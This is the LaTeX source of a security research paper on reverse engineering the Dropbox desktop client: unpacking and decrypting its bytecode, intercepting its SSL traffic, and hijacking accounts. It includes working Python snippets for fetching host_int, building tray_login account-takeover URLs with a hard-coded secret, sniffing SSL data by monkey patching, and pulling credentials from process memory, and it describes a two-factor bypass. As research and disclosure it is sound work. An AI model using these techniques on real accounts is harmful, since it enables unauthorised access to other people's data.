\documentclass[letterpaper,twocolumn,10pt]{article}
\usepackage{usenix,epsfig}
\usepackage{usenix,epsfig,endnotes}
\usepackage{ucs}
\usepackage{minted}
\usepackage{hyperref}
\usepackage{listings}
\lstset{language=Python}
\usepackage{url}
\usepackage[utf8x]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[hyphenbreaks]{breakurl}
\usepackage{ragged2e}
\setlength\partopsep{-\topsep}
\addtolength\partopsep{-\parskip}
\lstnewenvironment{code}[1][] {
   \noindent
   \minipage{\linewidth}
   \vspace{0.05\baselineskip}
   \lstset{basicstyle=\ttfamily\footnotesize,
   showspaces=false,showstringspaces=false,frame=single,#1}}
{\endminipage}
\newcommand*\wrapletters[1]{\wr@pletters#1\@nil}
\def\wr@pletters#1#2\@nil{#1\allowbreak\if&#2&\else\wr@pletters#2\@nil\fi}
\begin{document}

%don't want date printed
\date{}

%make title bold and 14 pt font (Latex default is non-bold, 16 pt)
\title{\Large \bf Looking inside the (Drop) box}

\author{ {\rm Dhiru Kholia}\\ Openwall / University of British Columbia \\
{\rm dhiru@openwall.com} \and {\rm Przemysław Węgrzyn}\\ CodePainters \\ {\rm
wegrzyn@codepainters.com} }

\maketitle

% Use the following at camera-ready time to suppress page numbers. Comment it
% out when you first submit the paper for review.
\pagestyle{empty}

\subsection*{Abstract}

Dropbox is a cloud based file storage service used by more than 175 million
users. In spite of its widespread popularity, we believe that Dropbox as a
platform hasn't been analyzed extensively enough from a security standpoint.
Also, the previous work on the security analysis of Dropbox has been heavily
censored. Moreover, the existing Python bytecode reversing techniques are not
enough for reversing \emph{hardened} applications like Dropbox.

This paper presents new and generic techniques, to reverse engineer
\emph{frozen} Python applications, which are not limited to just the Dropbox
world. We describe a method to bypass Dropbox's two factor authentication and
hijack Dropbox accounts. Additionally, generic techniques to intercept SSL data
using code injection techniques and \emph{monkey patching} are presented.

We believe that our biggest contribution is to open up the Dropbox platform to
further security analysis and research. Dropbox will / should no longer be a
black box. Finally, we describe the design and implementation of an open-source
version of Dropbox client (and yes, it runs on ARM too).

\section{Introduction}

The Dropbox clients run on around ten platforms and many of these Dropbox
clients are written mostly in Python~\cite{DropboxPyCon11}. The client consists
of a modified Python interpreter running obfuscated Python bytecode. However,
Dropbox being a proprietary platform, no source code is available for these
clients. Moreover, the API being used by the various Dropbox clients is not
documented.

Before trusting our data to Dropbox, it would be wise (in our opinion) to know
more about the internals of Dropbox. Questions about the security of the
uploading process, two-factor authentication and data encryption are some of
the most obvious.

Our paper attempts to answer these questions and more. In this paper, we show
how to unpack, decrypt and decompile Dropbox from scratch and in full detail.
This paper presents new and generic techniques to reverse engineer frozen Python
applications. Once you have the decompiled source-code, it is possible to study
how Dropbox works in detail. This Dropbox source-code reversing step is the
foundation of this paper and is described in section~\ref{sec:breaking}.

Our work uses various code injection techniques and monkey-patching to
intercept SSL data in Dropbox client. We have used these techniques
successfully to snoop on SSL data in other commercial products as well. These
techniques are generic enough and we believe would aid in future software
development, testing and security research.

Our work reveals the internal API used by Dropbox client and makes it
straightforward to write a portable open-source Dropbox client, which we
present in section~\ref{sec:internals}. Ettercap and Metasploit plug-ins (for
observing \emph{LAN sync} protocol and account hijacking, respectively) are
presented which break various security aspects of Dropbox. Additionally, we
show how to bypass Dropbox's two factor authentication and gain access to
user's data.

We hope that our work inspires the security community to write an open-source
Dropbox client, refine the techniques presented in this paper and conduct
research into other cloud based storage systems.

\section{Existing Work}

In this section, we cover existing work related to security analysis of Dropbox
and analyze previously published reversing techniques for Python applications.

\emph{Critical Analysis of Dropbox Software Security}~\cite{nicolas2012}
analyzes Dropbox versions from 1.1.x to 1.5.x. However, the techniques
presented in this paper are not generic enough to deal with the changing
bytecode encryption methods employed in Dropbox and in fact, fail to work for
Dropbox versions >= 1.6. Another tool called \emph{dropboxdec, Dropbox Bytecode
Decryption Tool}~\cite{dropboxdec} fails to work since it only can deal with
encryption algorithm used in the earlier versions (1.1.x) of Dropbox. Our work
bypasses the bytecode decryption step entirely and is more robust against the
ever changing encryption methods employed in Dropbox.

The techniques presented in \emph{pyREtic}~\cite{smith2010} do not work against
Dropbox since \emph{co\_code} (code object attribute which contains bytecode)
cannot be accessed any more at the Python layer. Furthermore, the key technique
used by pyREtic (replacing original obfuscated \emph{.pyc} bytecode file with
desired .py file) to gain control over execution no longer works. Dropbox
patches the standard import functionality which renders pyREtic's key technique
useless. We get around this problem by using standard and well-understood code
injection techniques like Reflective DLL injection~\cite{fewer2008reflective}
(on Windows) and LD\_PRELOAD~\cite{LDPRELOAD} (on Linux). \emph{marshal.dumps}
function which could be potentially used for dumping bytecode is patched too!
Also, techniques described in \emph{Reverse Engineering Python
Applications}~\cite{portnoy2008reverse} do not work against Dropbox for the
very same reasons. We work around this problem by dynamically finding the
co\_code attribute at the C layer. In short, Dropbox is challenging to reverse
and existing techniques fail.

Another interesting attack on the older versions of Dropbox is implemented in
the dropship tool~\cite{Dropship}. Essentially dropship allows a user to gain
access to files which the user doesn't own provided the user has the correct
cryptographic hashes of the desired files. However, Dropbox has patched this
attack vector and we have not been able to find similar attacks yet.

\section{Breaking the (Drop)box}
\label{sec:breaking}

In this section we explain various ways to reverse-engineer Dropbox application
on Windows and Linux platform. We have analyzed Dropbox versions from 1.1.x to
2.3.19 (latest as of 23-July-2013).

Dropbox clients for Linux, Windows and Mac OS are written mostly in Python. On
Windows, \emph{py2exe}~\cite{py2exe} is used for packaging the source-code and
generating the deliverable application. A heavily \emph{fortified} version of
the Python interpreter can be extracted from the PE resources of Dropbox.exe
executable using tools like PE Explorer or Resource Hacker. Dropbox.exe also
contains a ZIP of all encrypted .pyc files containing obfuscated bytecode.

On Linux, Dropbox is packaged (most likely) using the \emph{bbfreeze}
utility~\cite{bbfreeze}. bbfreeze uses static linking (for Python interpreter
and the OpenSSL library) and as such there is no shared library which can be
extracted out and analyzed in a debugger or a disassembler.

\subsection{Unpacking Dropbox}

A generic unpacker for Dropbox.exe executable (dropbox / main on Linux) is
trivial to write,

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
import zipfile
from zipfile import PyZipFile

fileName = "Dropbox.exe"
mode = "r"
ztype = zipfile.ZIP_DEFLATED

f = PyZipFile(fileName, "r", ztype)
f.extractall("bytecode_encrypted")
\end{minted}

This script will extract the encrypted .pyc files (which contain bytecode) in a
folder called \emph{bytecode\_encrypted}. Normally, .pyc files contain a
four-byte magic number, a four-byte modification timestamp and a marshalled
code object~\cite{nedbatchelder}. In case of Dropbox, the marshalled code
object is encrypted. In the next section, we describe various techniques to
decrypt these encrypted .pyc files.

\subsection{Decrypting encrypted Dropbox bytecode}

As briefly mentioned earlier, we extract the customized Python interpreter
named Python27.dll from the PE resources of Dropbox.exe executable using PE
Explorer. This Python27.dll file from the Windows version of Dropbox was
analyzed using IDA Pro and BinDiff to see how it is different from the standard
interpreter DLL. We found out that many standard functions like PyRun\_File(),
marshal.dumps are nop'ed out to make reverse engineering Dropbox harder.

A casual inspection of extracted .pyc files reveals no visible strings which is
not the case with standard .pyc files. This implies that encryption (or some
obfuscation) is being employed by Dropbox to protect bytecode. We found that
Python’s r\_object() (in marshal.c) function was patched to decrypt code
objects upon loading. Additionally, Dropbox's .pyc files use a non-standard
magic number (4 bytes), this however is trivial to fix. To decrypt the buffer
r\_object() calls a separate function inside Python27.dll. We figured out a way
to call this decryption function from outside the DLL and then consequently
dump the decrypted bytecode back to disk. There is no need at all to analyse
the encryption algorithm, keys, etc. However we had to rely on calling a
hard-coded address and this decryption function has no symbol attached.
Additionally, On Linux, everything is statically linked into a single binary
and the decryption function is inlined into r\_object(). So, we can no longer
call this decryption function in a standalone fashion.

To overcome this problem, we looked around for a more robust approach and hit
upon the idea of loading the .pyc files into memory from the disk and then
serializing them back. We use LD\_PRELOAD (Reflective DLL injection on Windows)
to inject our C code into dropbox process, then we override (hijack) a common C
function (like strlen) to gain control over the control flow and finally we
inject Python code by calling PyRun\_SimpleString (official Python C API
function which is not patched!). Hence it is possible to execute arbitrary
code in Dropbox client context.

We should mention that running Python code from within the injected code in
Dropbox context requires GIL (Global Interpreter Lock)~\cite{GIL} to be
acquired.

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{c}
// use dlsym(RTLD_DEFAULT...) to find
// symbols from within the injected code

PyGILState_STATE gstate;
gstate = PyGILState_Ensure();
PyRun_SimpleString("print 'w00t!'");
\end{minted}

Now we explain how we get Dropbox to do the decryption work for us and for
free. From the injected code we can call
\emph{PyMarshal\_ReadLastObjectFromFile()} which loads the code object from
encrypted .pyc file. So, in memory we essentially have unencrypted code object
available. However, the co\_code string (which contains the bytecode
instructions) is not exposed at the Python layer (this can be done by modifying
code\_memberlist array in Objects/codeobject.c file). So after locating this
decrypted code object (using a linear memory search) we serialize it back to
file. However this again is not straightforward since marshal.dumps method is
nop'ed. In other words, object marshalling is stripped out in the custom
version of Python used by Dropbox.  So, we resort to using PyPy’s
\_marshal.py~\cite{PyPy} which we inject into the running Dropbox process.

Dropbox keeps changing the bytecode encryption scheme. In Dropbox 1.1.x, TEA
cipher, along with an RNG seeded by some values embedded in the code object of
each python module, is used to perform bytecode encryption~\cite{dropboxdec}.
In Dropbox 1.1.45 this RNG function was changed and this broke
dropboxdec~\cite{dropboxdec} utility. ~\cite{nicolas2012} runs into similar
problems as well. In short, these changing bytecode encryption schemes used by
Dropbox are quite effective against older reversing approaches. In contrast,
our reversing techniques are not affected by such changes at all.

In summary, we get decryption for free! Our method is a lot shorter, easier and
more reliable than the ones used in~\cite{dropboxdec} and~\cite{nicolas2012}. Overall,
we have 200 lines of C and 350 lines of Python (including marshal code from PyPy).
Our method is robust, as we do not even need to deal with the ever changing
decryption algorithms ourselves. Our decryption tool works with all versions of
Dropbox that we used for testing. Finally, the techniques described in this
section are generic enough and also work for reversing other frozen Python
applications (e.g. Druva inSync and Google Drive Insync client).

\subsection{Opcode remapping}

The next anti-reversing technique used by Dropbox is Opcode remapping. The
decrypted .pyc files have valid strings (which are expected in standard Python
byte-code), but these .pyc files still fail to load under standard interpreter
due to opcodes being swapped.

CPython is a simple opcode (1 byte long) interpreter. ceval.c is mostly a big
switch statement inside a loop which evaluates these opcodes. In Dropbox, this
part is patched to use different opcode values. We were able to recover this
mapping manually by comparing disassembled DLL with ceval.c (standard CPython
file). However, this process is time consuming and won't really scale if
Dropbox decided to use even slightly different opcode mapping in the newer
versions.

A technique to break this protection is described in pyREtic~\cite{smith2010}
paper and is partially used in dropboxdec~\cite{dropboxdec}. In short, Dropbox
bytecode is compared against standard Python bytecode for common modules.
It does not work (as it is) against Dropbox because co\_code (bytecode string)
is not available at the Python layer and Python import has been patched in
order to not load .py files. However, it is possible to compare decrypted
Dropbox bytecode (obtained using our method) with standard bytecode for common
Python modules and come up with opcode mapping used by Dropbox.

However, we used an alternative new technique for recovering opcode mapping
which is more effective. We make use of the low-level import functionality
present in Dropbox to import a specially crafted Python source file. This
Python source file \emph{exercises} all the possible opcodes. After the import
is done, we dump the obfuscated bytecode back to the disk. Once this is done,
the obfuscated bytecode is compared with the standard interpreter's bytecode
(for the very same specially crafted Python source file) and the mapping is
subsequently recovered.

In practice, the opcode mapping employed in Dropbox hasn't changed since
version 1.6.0. In the next section, we describe how to decompile the recovered
.pyc files.

\subsection{Decompiling decrypted bytecode}

For decompiling decrypted Python bytecode to Python source code we rely on
uncompyle2~\cite{uncompyle2}, which is a Python 2.7 byte-code decompiler,
written in Python 2.7.

uncompyle2 is straightforward to use and the decompiled source code works fine.
We were able to recover all the Python source code used in Dropbox with
uncompyle2.

In the next section, we analyse how Dropbox authentication works and then
present some attacks against it.

\section{Dropbox security and attacks}

Accessing Dropbox's website requires one to have the necessary credentials
(email address and password). The same credentials are also required in order
to link (register) a device with a Dropbox account. In this registration
process, the end-user device is associated with a unique \emph{host\_id} which
is used for all future authentication operations. In other words, Dropbox
client doesn't store or use user credentials once it has been linked to the
user account. host\_id is not affected by password changes and it is stored
locally on the end-user device.

In older versions (< 1.2.48) of Dropbox, this host\_id was stored locally in
clear-text in an \emph{SQLite} database (named
\emph{config.db}). By simply copying this SQLite database file to another
machine, it was possible to gain access to the target user's data. This attack
vector is described in detail in the "Dropbox authentication: insecure by design"
post~\cite{derek2011}.

However, from version 1.2.48 onwards, host\_id is now stored in an encrypted
local SQLite database~\cite{sqlite-dbx}. However, host\_id can still be
extracted from the encrypted SQLite database
(\emph{\$HOME/.dropbox/config.dbx}) since the \emph{secrets} (various inputs)
used in deriving the database encryption key are stored on the end-user device
(however, local storage of such secrets can't be avoided since Dropbox client
depends on them to work). On Windows, DPAPI encryption is used to protect the
secrets whereas on Linux a custom obfuscator is used by Dropbox. It is
straightforward to discover where the secrets are stored and how the database
encryption key is derived. The relevant code for doing so on Linux is in
\emph{common\_util/keystore/keystore\_linux.py} file.
dbx-keygen-linux~\cite{dbx-keygen-linux} (which uses reversed Dropbox sources)
is also capable of recovering the database encryption key. It also works for
decrypting \emph{filecache.dbx} encrypted database which contains meta-data
and which could be useful for forensic purposes.

Additionally, another value \emph{host\_int} in now involved in the
authentication process. After analyzing Dropbox traffic, we found out that
\emph{host\_int} is received from the server at startup and also that it does
not change.

\subsection{host\_id and host\_int}
Dropbox client has a handy feature which enables a user to login to Dropbox's
website without providing any credentials. This is done by selecting "Launch
Dropbox Website" from the Dropbox tray icon. So, how exactly does the Dropbox
client accomplish this? Well, two values, host\_id and host\_int are involved
in this process. In fact, knowing host\_id and host\_int values that are being
used by a Dropbox client is enough to access all data from that particular
Dropbox account. host\_id can be extracted from the encrypted SQLite database
or from the target's memory using various code injection techniques.

host\_int can be sniffed from Dropbox LAN sync protocol traffic. While this
protocol can be disabled, it is turned on by default. We have written an
Ettercap plug-in~\cite{ettercap} to sniff the host\_int value remotely on a
LAN. It is also possible to extract this value from the target machine's
memory.

We found an interesting attack on Dropbox versions (<= 1.6.x) in which it was
possible to extract the host\_id and host\_int values from the logs generated
by the Dropbox client. However the Dropbox client generated these logs only when
a special environment variable (DBDEV) was set properly. Dropbox turns on logging
only when the MD5 checksum of DBDEV starts with "c3da6009e4". James Hall from the
\#openwall channel was able to crack this partial MD5 hash and he found out that the
string "a2y6shya" generates the required partial MD5 collision. Our Metasploit
plug-in~\cite{metasploit} exploits this "property" and is able to remotely
hijack Dropbox accounts. This property has been patched after we disclosed
it responsibly to Dropbox. However, the next section will describe a new way
of hijacking Dropbox accounts which cannot be patched easily.

We mentioned earlier that the host\_int value is received from the server at
startup and that it does not change. So, it is obviously possible to ask the
Dropbox server itself for this value, just like the Dropbox client does!

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
import json
import requests

host_id = <UNKNOWN>

data = ("buildno=Dropbox-win-1.7.5&tag="
        "&uuid=123456&server_list=True&"
	"host_id=%s&hostname=random"
	% host_id)

base_url = 'https://client10.dropbox.com'
url = base_url + '/register_host'

headers = {'content-type': \
   'application/x-www-form-urlencoded', \
   'User-Agent': "Dropbox ARM" }

r = requests.post(url, data=data,
    headers=headers)

data = json.loads(r.text)
host_int = data["host_int"]
\end{minted}

\subsection{Hijacking Dropbox accounts}

Once, host\_int and host\_id values for a particular Dropbox client are known,
it is possible to gain access to that account using the following code. We call
this the \emph{tray\_login} method.

% XXX ugly hack
\vspace{15mm}

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
import hashlib
import time

host_id = <UNKNOWN>
host_int = <ASK SERVER>

now = int(time.time())

fixed_secret = 'sKeevie4jeeVie9bEen5baRFin9'

h = hashlib.sha1('%s%s%d'% (fixed_secret,
    host_id, now)).hexdigest()

url = ("https://www.dropbox.com/tray_login?"
       "i=%d&t=%d&v=%s&url=home&cl=en" %
       (host_int, now, h))

\end{minted}

Accessing the \emph{url} output of the above code takes one to the Dropbox
account of the target user. We have shown (in the previous section) a method to
get the host\_int value from the Dropbox server itself. So, in short, we have
\emph{revived} the earlier attack (which was fixed by Dropbox) on Dropbox
accounts which required knowing only the host\_id value to access the target's
Dropbox account.

While this new technique for hijacking Dropbox accounts works fine currently,
we have observed that the latest versions of Dropbox client do not use this
\emph{tray\_login} mechanism (in order to allow the user to automatically login
to the website). They now rely on heavier obfuscation and random \emph{nonces}
(received from the server) to generate those auto-login URLs. We plan to
\emph{break} this new auto-login mechanism in the near future.

\section{Intercepting SSL data}
\label{sec:internals}
In previous code samples, we have used undocumented Dropbox API. In this
section we describe how we discovered this internal API. Existing SSL MiTM
(man-in-the-middle) tools (e.g. Burp Suite) cannot sniff Dropbox traffic since
Dropbox client uses hard coded SSL certificates. Additionally the OpenSSL
library is statically linked with Dropbox executable. Binary patching is
somewhat hard and time-consuming. We get around this problem by using
Reflective DLL injection~\cite{fewer2008reflective} (on Windows) and
LD\_PRELOAD~\cite{LDPRELOAD} on Linux) to gain control over execution, followed
by monkey patching~\cite{monkey} of all "interesting" objects.

Once we are able to execute arbitrary code in Dropbox client context, we patch
all \emph{SSL objects} and are able to snoop on the data before it has been encrypted
(on sending side) and after it has been decrypted (on receiving side). This is
how we intercept SSL data. We have successfully used the same technique on
multiple commercial Python applications (e.g. Druva inSync). The following code
shows how we locate and patch interesting Python objects at runtime.

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}
import gc

f = open("SSL-data.txt", "w")

def ssl_read(*args):
    data = ssl_read_saved(*args)
    f.write(str(data))
    return data

def patch_object(obj):
    if isinstance(obj, SSLSocket) \
      and not hasattr(obj, "marked"):
        obj.marked = True
        ssl_read_saved = obj.read
        obj.read = ssl_read

while True:
    objs = gc.get_objects()

    for obj in objs:
        patch_object(obj)

    time.sleep(1)
\end{minted}

This monkey patching technique to intercept SSL data can also be used with
other dynamic languages like Ruby, Perl, JavaScript, Perl and Groovy.

\subsection{Bypassing 2FA}

We found that two-factor authentication (as used by Dropbox) only protects
against unauthorized access to the Dropbox's website. The Dropbox internal
client API does not support or use two-factor authentication! This implies
that it is sufficient to have only the host\_id value to gain access to
the target's data stored in Dropbox.

Furthermore, we can \emph{inject} this host\_id value into a Dropbox client and
then, use the client's tray\_login (auto-login) feature to gain access to the
Dropbox's website.

In summary, we have demonstrated that the whole security of the Dropbox
eco-system relies on a single 32-byte value, namely the host\_id.

\subsection{Open-source Dropbox client}

Based on the findings of the earlier sections, it is straightforward to write
an open-source Dropbox client. The following code snippet shows how to fetch
the list of files stored in a Dropbox account.

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{python}

host_id = "?"

BASE_URL = 'https://client10.dropbox.com/'
register_url = BASE_URL + 'register_host'
list_url = BASE_URL + "list"

# headers
headers = {'content-type': \
   'application/x-www-form-urlencoded', \
   'User-Agent': "Dropbox ARM" }

# message
data = ("buildno=ARM&tag=&uuid=42&"
   "server_list=True&host_id=%s"
   "&hostname=r" % host_id)

r = requests.post(register_url,
   data=data, headers=headers)

# extract data
data = json.loads(r.text)
host_int = data["host_int"]
root_ns = data["root_ns"]

# fetch data list
root_ns = str(root_ns) + "_-1"

data = data + ("&ns_map=%s&dict_return=1"
   "&server_list=True&last_cu_id=-1&"
   "need_sandboxes=0&xattrs=True"
   % root_ns)

# fetch list of files
r = requests.post(list_url,
   data=data, headers=headers)

data = json.loads(r.text)
paths = data["list"]

# show a list of files and their hashes
print paths

\end{minted}

Similarly, we are able to upload and update files using our open-source Dropbox
client. We hope that our work inspires the open-source community to write a
full-fledged open-source Dropbox client capable of running even on platforms
not supported by Dropbox.

\subsection{New ways to hijack accounts}

We have briefly mentioned previously that it is possible to extract host\_id
and host\_int from the Dropbox client's memory once control of execution flow
has been gained by using Reflective DLL injection or LD\_PRELOAD. The following
code snippet shows how exactly this can be accomplished.

\begin{minted}[mathescape, frame=lines, framesep=2mm, fontsize=\footnotesize]{c}
# 1. Inject code into Dropbox.
# 2. Locate PyRun_SimpleString using dlsym
#    from within the Dropbox process
# 3. Feed the following code to the located
#    PyRun_SimpleString

import gc

objs = gc.get_objects()
for obj in objs:
    if hasattr(obj, "host_id"):
        print obj.host_id
    if hasattr(obj, "host_int"):
        print obj.host_int

\end{minted}

We believe that this technique (snooping on objects) is hard to protect
against. Even if Dropbox somehow prevents attackers from gaining control over
the execution flow, it is still possible to use smart \emph{memory snooping}
attacks as implemented in passe-partout~\cite{passe-partout}. We plan to extend
passe-partout to carry out more generic \emph{memory snooping} attacks in the
near future.

\section{Mitigations}

We believe that the \emph{arms race} between software protection and software
reverse engineering would go on. Protecting software against reverse
engineering is hard but it is definitely possible to make the process
of reverse engineering even harder.

Dropbox uses various techniques to deter reverse engineering like changing
bytecode magic number, bytecode encryption, opcode remapping, disabling
functions which could aid reversing, static linking, using hard coded
certificates and hiding raw bytecode objects. We think that all these
techniques are good enough against a casual attacker. Additionally, Dropbox
could use techniques like function name mangling, marshalling
format changes to make reverse engineering harder.

That being said, we wonder what Dropbox aims to gain by employing such
anti-reversing measures. Most of the Dropbox's "secret sauce" is on the
server side which is already well protected. We do not believe that these
anti-RE measures are beneficial for Dropbox users and for Dropbox.

\section{Challenges and future work}

The various things we would like to explore are finding automated techniques
for reversing opcode mappings and discovering new attacks on the LAN sync
protocol used by Dropbox.

Activating logging in Dropbox now requires cracking a full SHA-256 hash
(\wrapletters{e27eae61e774b19f4053361e523c771a92e838026da42c60e6b097d9cb2bc825}).
The plaintext corresponding to this hash needs to be externally supplied to
the Dropbox client (in order to activate logging) and this plaintext value is
not public.

Another interesting challenge is to run Dropbox back from its decompiled
sources. We have been partially successful (so far) in doing so. We would like
to work on making the technique of dumping bytecode from memory (described in
the pyREtic~\cite{smith2010} paper) work for Dropbox.

At some point, Dropbox service will disable the existing "tray\_login" method
which will make hijacking accounts harder. Therefore, we would like to continue
our work on finding new ways to do it.

\section{Acknowledgments}

We would like to thank Nicolas Ruff, Florian Ledoux and wibiti for their work
on uncompyle2. We also thank the anonymous reviewers as well as other Openwall
folks for their helpful comments and feedback.

\section{Availability}

Our and other tools used by us are available on GitHub at
\url{https://github.com/kholia}. Python decompiler is available
at~\cite{uncompyle2} and the code for Reflective DLL Injection is available
at~\cite{reflective}. We also plan to publish the complete source code of our
tools and exploits on GitHub around conference time.

\begingroup
\raggedright
{\footnotesize \bibliographystyle{acm}
\sloppy
\bibliography{WOOT13-dropbox}}
\endgroup

\end{document}

